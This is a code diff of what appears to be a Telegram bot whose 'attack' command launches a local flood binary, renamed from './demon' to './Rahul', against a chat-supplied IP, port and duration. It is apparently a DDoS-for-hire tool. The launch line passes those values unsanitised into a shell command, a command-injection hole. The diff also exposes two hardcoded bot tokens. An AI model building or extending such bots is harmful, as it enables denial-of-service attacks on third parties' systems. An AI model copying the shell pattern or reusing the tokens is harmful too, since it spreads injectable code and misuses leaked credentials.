@@ -114,7 +114,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
     try:
-        process = subprocess.Popen(f"./demon {ip} {port} {duration} 1200", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(f"./Rahul {ip} {port} {duration}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         process.communicate()
 
         if process.returncode != 0:
@@ -193,7 +193,7 @@ async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 # Main function
 def main():
-    app = ApplicationBuilder().token("8155654788:AAHHDwR2ZCyaW61ubZB-3rlqAi01EwQI9KA").build()
+    app = ApplicationBuilder().token("8192005864:AAHwcUsc6p138qf5vG0NeyyK3l2sOEJ2Iek").build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_command))
